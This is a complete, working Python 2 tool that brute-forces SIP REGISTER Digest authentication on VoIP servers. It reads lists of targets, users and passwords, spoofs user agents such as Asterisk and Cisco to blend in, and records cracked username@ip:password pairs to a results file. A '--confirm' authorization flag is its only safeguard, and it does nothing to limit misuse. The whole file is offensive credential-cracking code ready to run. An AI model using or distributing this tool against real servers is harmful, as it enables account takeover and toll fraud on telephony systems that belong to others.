#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
import argparse
import socket
import hashlib
import random
import time
import threading
import Queue
import re
import sys
import os
import signal
import logging

DEFAULT_RESULTS = "results.txt"
DEFAULT_UA_FILE = "useragents.txt"


# -------------------- SIP Message Builder --------------------
class SIPMessageBuilder(object):
    """Build SIP messages (REGISTER)."""

    @staticmethod
    def gen_branch():
        return "z9hG4bK" + str(random.randint(100000, 999999))

    @staticmethod
    def gen_callid():
        return "%d-%d@local" % (int(time.time() * 1000), random.randint(1000, 9999))

    @staticmethod
    def build_register(ip, port, user, callid, cseq, branch, auth_header=None, ua=None):
        ua = ua or "SIPVicious"
        lines = [
            "REGISTER sip:%s:%d SIP/2.0" % (ip, port),
            "Via: SIP/2.0/UDP 0.0.0.0;branch=%s;rport" % branch,
            "Max-Forwards: 70",
            "From: <sip:%s@%s>;tag=deadbeef" % (user, ip),
            "To: <sip:%s@%s>" % (user, ip),
            "Call-ID: %s" % callid,
            "CSeq: %d REGISTER" % cseq,
            "Contact: <sip:%s@0.0.0.0>" % user,
            "Expires: 3600",
            "User-Agent: %s" % ua,
            "Content-Length: 0",
            ""
        ]
        if auth_header:
            lines.insert(-2, auth_header)
        return "\r\n".join(lines) + "\r\n"


# -------------------- Digest Auth Helper --------------------
class DigestAuth(object):
    """Parse WWW-Authenticate/Proxy-Authenticate and compute Digest response."""

    @staticmethod
    def extract_realm_nonce(resp):
        if not resp:
            return (None, None)
        m = re.search(r'(?:WWW-Authenticate|Proxy-Authenticate)\s*: \s*Digest\b([^\r\n]*)', resp, flags=re.I)
        if m:
            hdr = m.group(1)
            realm_m = re.search(r'realm="([^"]+)"', hdr)
            nonce_m = re.search(r'nonce="([^"]+)"', hdr)
            return (realm_m.group(1) if realm_m else None, nonce_m.group(1) if nonce_m else None)
        m2 = re.search(r'realm="([^"]+)".*?nonce="([^"]+)"', resp)
        if m2:
            return (m2.group(1), m2.group(2))
        return (None, None)

    @staticmethod
    def response(user, realm, pwd, nonce, uri):
        ha1 = hashlib.md5("%s:%s:%s" % (user, realm, pwd)).hexdigest()
        ha2 = hashlib.md5("REGISTER:%s" % uri).hexdigest()
        return hashlib.md5("%s:%s:%s" % (ha1, nonce, ha2)).hexdigest()


# -------------------- SIP UDP Client --------------------
class SIPClient(object):
    """Simple UDP client wrapper. Returns decoded string or None on error."""

    def __init__(self, timeout=5):
        self.timeout = timeout

    def send_recv(self, ip, port, message):
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.sendto(message, (ip, port))
            resp = sock.recv(8192)
            # In Py2 recv returns str; in Py3 bytes. Try to return unicode text.
            if isinstance(resp, bytes):  # Py3
                try:
                    return resp.decode("utf-8", "ignore")
                except Exception:
                    return resp.decode("latin-1", "ignore")
            else:  # Py2 str
                try:
                    return resp.decode("utf-8") if isinstance(resp, str) else resp
                except Exception:
                    # If decode fails, return raw str
                    return resp
        except socket.timeout:
            return None
        except Exception:
            return None
        finally:
            try:
                if sock:
                    sock.close()
            except Exception:
                pass


# -------------------- Thread-safe Result Writer --------------------
class ResultWriter(object):
    """Append-only thread-safe writer for results."""

    def __init__(self, path=DEFAULT_RESULTS):
        self.path = path
        self.lock = threading.Lock()
        try:
            self._fh = open(self.path, "a")
        except Exception:
            # Best-effort: fallback to stdout if file cannot be opened
            self._fh = None
            logging.exception("Could not open results file %s", self.path)

    def write(self, line):
        with self.lock:
            if self._fh:
                try:
                    self._fh.write(line + "\n")
                    self._fh.flush()
                    return
                except Exception:
                    logging.exception("Failed writing to results file, falling back to stdout")
                    try:
                        self._fh.close()
                    except Exception:
                        pass
                    self._fh = None
            # fallback
            try:
                print(line)
            except Exception:
                pass

    def close(self):
        with self.lock:
            try:
                if self._fh:
                    self._fh.close()
            except Exception:
                pass


# -------------------- Worker --------------------
class SIPRegisterWorker(object):
    """Worker callable that processes queue items and tries REGISTER + Digest auth."""

    def __init__(self, queue, client, writer, ualist, stop_event, logger=None, rate=0.0):
        self.queue = queue
        self.client = client
        self.writer = writer
        self.ualist = ualist or ["SIPp/3.6", "Asterisk PBX", "Cisco-SIPGateway", "Twinkle/1.10", "Linphone/4.4"]
        self.stop_event = stop_event
        self.logger = logger or logging.getLogger(__name__)
        self.rate = float(rate)

    def rand_ua(self):
        return random.choice(self.ualist)

    def parse_status(self, resp):
        if not resp:
            return None
        m = re.search(r"SIP/2.0\s+(\d+)", resp)
        return int(m.group(1)) if m else None

    def __call__(self):
        builder = SIPMessageBuilder
        auth = DigestAuth
        while self.stop_event.is_set():
            try:
                ip, port, user, pwd = self.queue.get(timeout=1)
            except Queue.Empty:
                if not self.stop_event.is_set():
                    break
                continue

            try:
                callid = builder.gen_callid()
                r1 = builder.build_register(ip, port, user, callid, 1, builder.gen_branch(), ua=self.rand_ua())
                resp1 = self.client.send_recv(ip, port, r1)
                code1 = self.parse_status(resp1)

                if code1 == 200:
                    # no auth required
                    self.queue.task_done()
                    continue

                if code1 in (401, 407):
                    realm, nonce = auth.extract_realm_nonce(resp1)
                    if not realm or not nonce:
                        self.queue.task_done()
                        continue

                    uri = "sip:%s:%d" % (ip, port)
                    response = auth.response(user, realm, pwd, nonce, uri)
                    auth_hdr = ('Authorization: Digest username="%s", realm="%s", nonce="%s", '
                                'uri="%s", response="%s", algorithm=MD5') % (user, realm, nonce, uri, response)

                    r2 = builder.build_register(ip, port, user, callid, 2, builder.gen_branch(), auth_hdr, self.rand_ua())
                    resp2 = self.client.send_recv(ip, port, r2)
                    code2 = self.parse_status(resp2)

                    if code2 == 200 or (resp2 and resp2.strip().upper().startswith("OPTIONS")):
                        line = "%s@%s:%s" % (user, ip, pwd)
                        self.writer.write(line)
                        self.logger.info("[+] %s", line)

                if self.rate:
                    time.sleep(self.rate)

            except Exception:
                self.logger.debug("Worker exception", exc_info=True)
            finally:
                try:
                    self.queue.task_done()
                except Exception:
                    pass


# -------------------- Orchestrator --------------------
class SIPRegisterCracker(object):
    """Orchestrates workers, queueing, and graceful shutdown."""

    def __init__(self, targets, users, passwords, threads=20, timeout=5, rate=0.0, ua_file=None, results_file=DEFAULT_RESULTS, verbose=False):
        self.targets = targets
        self.users = users
        self.passwords = passwords
        self.threads = threads
        self.timeout = timeout
        self.rate = rate
        self.ua_file = ua_file
        self.results_file = results_file

        self.queue = Queue.Queue(maxsize=5000)
        self.stop_event = threading.Event()
        self.stop_event.set()
        self.client = SIPClient(timeout=self.timeout)
        self.writer = ResultWriter(self.results_file)
        self.threads_list = []
        self.logger = logging.getLogger(__name__)
        logging.basicConfig(level=logging.DEBUG if verbose else logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

        self.user_agents = self._load_ua(self.ua_file) or ["SIPp/3.6", "Asterisk PBX", "Cisco-SIPGateway", "Twinkle/1.10", "Linphone/4.4"]

        signal.signal(signal.SIGINT, self._handle_sigint)

    def _handle_sigint(self, sig, frame):
        self.logger.info("SIGINT received, stopping...")
        self.stop_event.clear()

    def _load_ua(self, path):
        if not path or not os.path.isfile(path):
            return []
        try:
            with open(path, "r") as fh:
                return [x.strip() for x in fh if x.strip()]
        except Exception:
            self.logger.exception("Failed loading UA file")
            return []

    def start_workers(self):
        for _ in range(self.threads):
            worker = SIPRegisterWorker(self.queue, self.client, self.writer, self.user_agents, self.stop_event, logger=self.logger, rate=self.rate)
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads_list.append(t)

    def enqueue_all(self):
        for user in self.users:
            for pwd_raw in self.passwords:
                pwd = pwd_raw.replace("[%]", user)
                for t in self.targets:
                    if not self.stop_event.is_set():
                        return
                    parts = t.split(":")
                    ip = parts[0]
                    try:
                        port = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5060
                    except Exception:
                        port = 5060
                    while True:
                        try:
                            self.queue.put((ip, port, user, pwd), timeout=1)
                            break
                        except Queue.Full:
                            if not self.stop_event.is_set():
                                return

    def run(self):
        self.start_workers()
        try:
            self.enqueue_all()
            # Wait until queue is empty or user interrupts
            while (not self.queue.empty()) and self.stop_event.is_set():
                time.sleep(0.1)
            # Wait for any remaining in-progress tasks to complete
            try:
                self.queue.join()
            except Exception:
                pass
        except Exception:
            self.logger.exception("Error during run")
        finally:
            self.stop_event.clear()
            # allow workers to wake up and exit
            time.sleep(0.2)
            self.writer.close()


# -------------------- CLI --------------------
def read_lines(path):
    if not os.path.isfile(path):
        raise IOError("File not found: %s" % path)
    with open(path, "r") as fh:
        return [x.strip() for x in fh if x.strip()]


def main():
    parser = argparse.ArgumentParser(description="SIP register toolkit (Python 2). Use only on authorized targets.")
    parser.add_argument("targets", help="targets file (ip[:port])")
    parser.add_argument("users", help="users file")
    parser.add_argument("passwords", help="passwords file (use [%] to insert username)")
    parser.add_argument("-t", "--threads", type=int, default=20, help="number of worker threads")
    parser.add_argument("--timeout", type=float, default=5.0, help="socket timeout seconds")
    parser.add_argument("--rate", type=float, default=0.0, help="delay (s) between attempts per worker")
    parser.add_argument("--ua-file", default=DEFAULT_UA_FILE, help="optional user-agents file")
    parser.add_argument("--results", default=DEFAULT_RESULTS, help="results output file")
    parser.add_argument("-v", "--verbose", action="store_true", help="verbose logging")
    parser.add_argument("--confirm", action="store_true", help="confirm you are authorized to test targets")
    args = parser.parse_args()

    if not args.confirm:
        print("WARNING: You must confirm you are authorized to test these targets. Re-run with --confirm to proceed.")
        sys.exit(1)

    try:
        targets = read_lines(args.targets)
        users = read_lines(args.users)
        passwords = read_lines(args.passwords)
    except Exception as e:
        print("Error reading input files:", e)
        sys.exit(1)

    if not targets or not users or not passwords:
        print("Targets, users or passwords empty. Exiting.")
        sys.exit(1)

    cracker = SIPRegisterCracker(targets, users, passwords, threads=args.threads, timeout=args.timeout, rate=args.rate, ua_file=args.ua_file, results_file=args.results, verbose=args.verbose)
    cracker.run()


if __name__ == "__main__":
    main()